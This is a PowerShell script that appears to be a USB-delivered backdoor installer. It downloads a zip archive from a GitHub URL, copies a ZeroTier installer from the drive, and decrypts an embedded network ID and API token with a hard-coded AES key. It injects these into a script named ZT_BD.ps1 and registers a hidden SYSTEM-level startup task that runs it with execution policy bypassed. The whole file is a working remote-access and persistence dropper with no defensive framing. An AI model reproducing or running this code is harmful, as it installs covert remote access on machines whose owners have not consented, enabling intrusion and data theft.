function install ($driveletter){
    function Decrypt-String {
    param (
        [string]$cipherTextBase64,
        [string]$keyBase64,
        [string]$ivBase64
    )
    
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [Convert]::FromBase64String($keyBase64)
    $aes.IV = [Convert]::FromBase64String($ivBase64)
    
    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $cipherTextBytes = [Convert]::FromBase64String($cipherTextBase64)
    
    $decryptedBytes = $decryptor.TransformFinalBlock($cipherTextBytes, 0, $cipherTextBytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile('https://raw.githubusercontent.com/NintendoWii/random/main/zt_duck/zt.zip','C:\windows\temp\zt.zip')    

    cd C:\windows\temp
    Expand-Archive -Path C:\windows\temp\zt.zip
    del C:\windows\temp\zt.zip
    cp $driveletter\duck\ZeroTier-One.msi C:\windows\temp\zt\

    $content= Get-Content C:\windows\temp\zt\1.txt
    $net_id= $($content[0]).split('|')[-1].TrimStart()
    $api= $($content[1]).split('|')[-1].TrimStart()
    $key= 'HSOYO+VRCTH5DbBuoFbyiSJeK9I+/5gpUchWueXrddY='
    $iv= '7hnFIGjqlk+3k1zMwJc2PA=='
    $net_id= Decrypt-String -cipherTextBase64 $net_id -keyBase64 $key -ivBase64 $iv
    $api= Decrypt-String -cipherTextBase64 $api -keyBase64 $key -ivBase64 $iv
    $net_id= '$networkID= ' + '"' + $net_id + '"'
    $api= '$token= ' + '"' + $api + '"'
    $code= @()
    $code+= $net_id
    $code+= $api
    $code+= $(Get-Content C:\windows\temp\zt\ZT_BD.ps1)
    $code >C:\windows\temp\zt\ZT_BD.ps1

    $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File C:\windows\temp\zt\ZT_BD.ps1'
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 0 -Hours 0 -Minutes 0 -Seconds 0)
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal -TaskName "zt_bd"
    Start-ScheduledTask -TaskName "zt_bd"
}

$driveletter= $args[0]
install $driveletter
